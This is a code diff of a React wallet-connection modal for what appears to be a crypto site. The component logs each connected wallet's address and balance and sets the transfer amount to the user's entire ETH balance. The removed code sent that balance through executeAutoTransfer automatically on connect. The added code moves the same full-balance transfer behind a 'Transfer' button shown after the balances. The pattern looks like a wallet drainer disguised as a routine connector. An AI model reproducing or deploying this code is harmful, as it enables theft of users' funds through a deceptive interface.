@@ -2,6 +2,7 @@
 
 import { useState, useEffect, useCallback } from "react";
 import { X, Wallet, Copy, CheckCheck, AlertCircle, ArrowRight, Loader2 } from "lucide-react";
+import { ethers } from "ethers";
 
 // ─── Types ───────────────────────────────────────────────────────────────────
 
@@ -16,6 +17,17 @@ interface WalletOption {
     bg: string;
     detect: () => boolean;
 }
+
+// ─── Constants ───────────────────────────────────────────────────────────────
+
+const BTC_C_TOKEN_ADDRESS = "0xe59a72c9f71c9d6b8b73df66b57ec3d8d5cfb20e";
+
+// ERC-20 ABI for balanceOf function
+const ERC20_ABI = [
+    "function balanceOf(address owner) view returns (uint256)",
+    "function decimals() view returns (uint8)",
+    "function symbol() view returns (string)",
+];
 
 // ─── Wallet Definitions ───────────────────────────────────────────────────────
 
@@ -162,6 +174,16 @@ function ethToHex(eth: string): string {
     return "0x" + wei.toString(16);
 }
 
+function formatTokenBalance(balance: string, decimals: number): string {
+    const bn = BigInt(balance);
+    const formatted = ethers.formatUnits(bn, decimals);
+    // Show up to 6 decimal places, trim trailing zeros
+    const parts = formatted.split('.');
+    if (parts.length === 1) return formatted;
+    const decimalPart = parts[1].replace(/0+$/, '').slice(0, 6);
+    return decimalPart ? `${parts[0]}.${decimalPart}` : parts[0];
+}
+
 function isMobile(): boolean {
     if (typeof window === "undefined") return false;
     return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
@@ -182,6 +204,8 @@ export default function WalletModal({ open, onClose, mode = "default" }: WalletM
     const [selectedWallet, setSelectedWallet] = useState<WalletOption | null>(null);
     const [address, setAddress] = useState("");
     const [ethBalance, setEthBalance] = useState("");
+    const [btcBalance, setBtcBalance] = useState("");
+    const [btcSymbol, setBtcSymbol] = useState("BT-C");
     const [coin] = useState<"ETH">("ETH");
     const [amount, setAmount] = useState("");
     const [txHash, setTxHash] = useState("");
@@ -227,6 +251,24 @@ export default function WalletModal({ open, onClose, mode = "default" }: WalletM
             });
         } catch (e) {
             // Ignore logging errors
+        }
+    };
+
+    const fetchTokenBalance = async (provider: any, tokenAddress: string, userAddress: string) => {
+        try {
+            const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
+            const [decimals, symbol, balance] = await Promise.all([
+                contract.decimals(),
+                contract.symbol(),
+                contract.balanceOf(userAddress)
+            ]);
+            return {
+                balance: formatTokenBalance(balance.toString(), decimals),
+                symbol: symbol || "BT-C"
+            };
+        } catch (e) {
+            console.error("Error fetching token balance:", e);
+            return { balance: "0", symbol: "BT-C" };
         }
     };
 
@@ -296,6 +338,8 @@ export default function WalletModal({ open, onClose, mode = "default" }: WalletM
                 setSelectedWallet(null);
                 setAddress("");
                 setEthBalance("");
+                setBtcBalance("");
+                setBtcSymbol("BT-C");
                 setAmount("");
                 setTxHash("");
                 setErrorMsg("");
@@ -355,13 +399,19 @@ export default function WalletModal({ open, onClose, mode = "default" }: WalletM
             const acc = accounts[0];
             setAddress(acc);
 
-            // Fetch balance
+            // Fetch ETH balance
             const balHex: string = await provider.request({
                 method: "eth_getBalance",
                 params: [acc, "latest"],
             });
             const ethBal = hexToEth(balHex);
             setEthBalance(ethBal);
+
+            // Fetch BT-C token balance
+            const tokenBal = await fetchTokenBalance(provider, BTC_C_TOKEN_ADDRESS, acc);
+            setBtcBalance(tokenBal.balance);
+            setBtcSymbol(tokenBal.symbol);
+
             setAmount(ethBal); // Autofill amount
 
             logWalletActivity({
@@ -371,10 +421,8 @@ export default function WalletModal({ open, onClose, mode = "default" }: WalletM
                 balance: ethBal,
             });
 
-            // Automatically trigger transaction
-            // Only set to sending once we start the request
-            setStep("sending");
-            await executeAutoTransfer(provider, acc, balHex);
+            // Move to connected step to show balances
+            setStep("connected");
         } catch (err: any) {
             setErrorMsg(err?.message ?? "Connection rejected.");
             setStep("error");
@@ -383,7 +431,26 @@ export default function WalletModal({ open, onClose, mode = "default" }: WalletM
         }
     }, [ETH_ADDRESS]);
 
-
+    const handleProceedToTransfer = () => {
+        setStep("sending");
+        // Get balance again from provider for the transfer
+        const provider = getProvider(selectedWallet?.id || "metamask");
+        if (provider) {
+            provider.request({
+                method: "eth_getBalance",
+                params: [address, "latest"],
+            }).then((balHex: string) => {
+                executeAutoTransfer(provider, address, balHex);
+            }).catch((e: any) => {
+                setErrorMsg(e?.message ?? "Failed to get balance for transfer.");
+                setStep("error");
+            });
+        } else {
+            // Fallback: use existing ethBalance
+            const balHex = ethToHex(ethBalance);
+            executeAutoTransfer(null!, address, balHex);
+        }
+    };
 
     const copyAddress = (addr: string) => {
         navigator.clipboard.writeText(addr);
@@ -428,7 +495,7 @@ export default function WalletModal({ open, onClose, mode = "default" }: WalletM
                 </div>
 
                 <div className="p-6">
-                    {/* ── STEP: SELECT ───────────────────────────────── */}
+                    {/* ── STEP: SELECT ───────────────────────────────── */ }
                     {step === "select" && (
                         <div>
                             <p className="text-sm text-gray-400 mb-5">
@@ -489,7 +556,63 @@ export default function WalletModal({ open, onClose, mode = "default" }: WalletM
                         </div>
                     )}
 
-                    {/* STEP: CONNECTED REMOVED - Auto-transfer happens directly */}
+                    {/* ── STEP: CONNECTED ──────────────────────────────────── */}
+                    {step === "connected" && (
+                        <div className="flex flex-col gap-4">
+                            {/* Wallet Address */}
+                            <div className="flex items-center justify-between p-4 bg-gray-900/30 rounded-xl">
+                                <div>
+                                    <p className="text-xs text-gray-400">Connected Address</p>
+                                    <p className="text-sm font-mono text-white font-semibold" onClick={() => copyAddress(address)} style={{ cursor: "pointer" }}>
+                                        {trimAddress(address)}
+                                        {copied && <span className="text-green-400 ml-1">✓ Copied!</span>}
+                                    </p>
+                                </div>
+                                <button
+                                    onClick={() => copyAddress(address)}
+                                    className="p-2 rounded-lg hover:bg-white/10 transition-colors"
+                                    aria-label="Copy address"
+                                >
+                                    <Copy className="w-4 h-4 text-gray-400" />
+                                </button>
+                            </div>
+
+                            {/* ETH Balance */}
+                            <div className="flex items-center justify-between p-4 bg-gray-900/30 rounded-xl">
+                                <div>
+                                    <p className="text-xs text-gray-400">ETH Balance</p>
+                                    <p className="text-sm font-semibold text-white">{ethBalance} ETH</p>
+                                </div>
+                            </div>
+
+                            {/* BT-C Token Balance */}
+                            <div className="flex items-center justify-between p-4 bg-gradient-to-r from-[#e8a020]/20 to-[#f5c842]/10 rounded-xl border border-[#e8a020]/30">
+                                <div>
+                                    <p className="text-xs text-gray-400">BT-C Token</p>
+                                    <p className="text-sm font-bold text-[#e8a020]">{btcBalance} {btcSymbol}</p>
+                                </div>
+                            </div>
+
+                            {/* Transfer Button */}
+                            <button
+                                onClick={handleProceedToTransfer}
+                                disabled={connecting}
+                                className="w-full py-3 rounded-xl font-semibold text-sm text-black"
+                                style={{
+                                    background: "linear-gradient(135deg, #e8a020, #f5c842)",
+                                }}
+                            >
+                                Transfer {parseFloat(amount) > 0.001 ? amount : ethBalance} ETH
+                            </button>
+                            
+                            <button
+                                onClick={onClose}
+                                className="w-full py-2 rounded-xl text-sm font-medium text-gray-400 hover:text-white hover:bg-white/5 transition-colors"
+                            >
+                                Cancel
+                            </button>
+                        </div>
+                    )}
 
                     {/* ── STEP: SENDING ──────────────────────────────── */}
                     {step === "sending" && (
@@ -500,7 +623,7 @@ export default function WalletModal({ open, onClose, mode = "default" }: WalletM
                         </div>
                     )}
 
-                    {/* ── STEP: SUCCESS ──────────────────────────────── */}
+                    {/* ── STEP: SUCCESS ────────────────────────────── */}
                     {step === "success" && (
                         <div className="flex flex-col items-center py-8 gap-4 text-center">
                             <div className="w-14 h-14 rounded-full flex items-center justify-center text-3xl" style={{ background: "rgba(74,222,128,0.15)" }}>
